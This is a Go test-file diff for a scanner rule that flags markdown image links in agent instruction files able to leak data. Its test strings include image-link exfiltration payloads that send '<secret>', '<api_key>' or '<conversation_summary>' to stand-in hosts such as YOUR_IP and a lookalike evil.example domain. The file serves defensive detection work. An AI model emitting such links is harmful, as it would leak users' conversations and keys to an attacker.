@@ -117,7 +117,8 @@ func TestCFG033_Issue888(t *testing.T) {
 }
 
 // <you>, <pr> and <host> name a repository location or a host, not
-// conversation data (#1190). <topic> stays a free-text slot.
+// conversation data (#1190). <topic> stays a free-text slot, except under
+// raw.githubusercontent.com (TestCFG033_RawGitHubPaths1190).
 func TestCFG033_Issue1190(t *testing.T) {
 	for _, s := range []string{
 		"![chart](https://raw.githubusercontent.com/<you>/<repo>/assets/<pr>/coverage.png)",
@@ -136,10 +137,35 @@ func TestCFG033_Issue1190(t *testing.T) {
 		"![x](https://example.com/img.png?d=<api_key>)",
 		"![x](https://example.com/q?pr=<pr>)",
 		"![x](https://example.com/p/<expr>.png)",
-		"![shot](https://raw.githubusercontent.com/my-org/my-tool/screens/<pr-number>-<topic>/<file>.png)",
+		"![t](https://example.com/screens/<pr-number>-<topic>/<file>.png)",
 	} {
 		if f := CFG033.Check(claudeMDTarget(s)); len(f) != 1 {
 			t.Errorf("expected one finding for %q, got %+v", s, f)
+		}
+	}
+}
+
+// Path-only placeholders under raw.githubusercontent.com are not a sink
+// (#1190, option C); other hosts and the query string still are.
+func TestCFG033_RawGitHubPaths1190(t *testing.T) {
+	for _, line := range []string{
+		"![chart](https://raw.githubusercontent.com/<you>/<repo>/assets/<pr>/coverage.png)",
+		"![shot](https://raw.githubusercontent.com/my-org/my-tool/screens/<pr-number>-<topic>/<file>.png)",
+		"![badge](https://example.com/badge/<host>.svg)",
+	} {
+		if f := CFG033.Check(claudeMDTarget(line)); len(f) != 0 {
+			t.Errorf("%s: %+v", line, f)
+		}
+	}
+	for _, line := range []string{
+		"![x](http://YOUR_IP:8000/p?d=<secret>)",
+		"![x](https://example.com/p/<conversation_summary>.png)",
+		"![x](https://example.com/img.png?d=<api_key>)",
+		"![x](https://raw.githubusercontent.com/o/r/main/a.png?d=<conversation_summary>)",
+		"![x](http://raw.githubusercontent.com.evil.example/<conversation_summary>.png)",
+	} {
+		if f := CFG033.Check(claudeMDTarget(line)); len(f) != 1 {
+			t.Errorf("%s: %+v", line, f)
 		}
 	}
 }
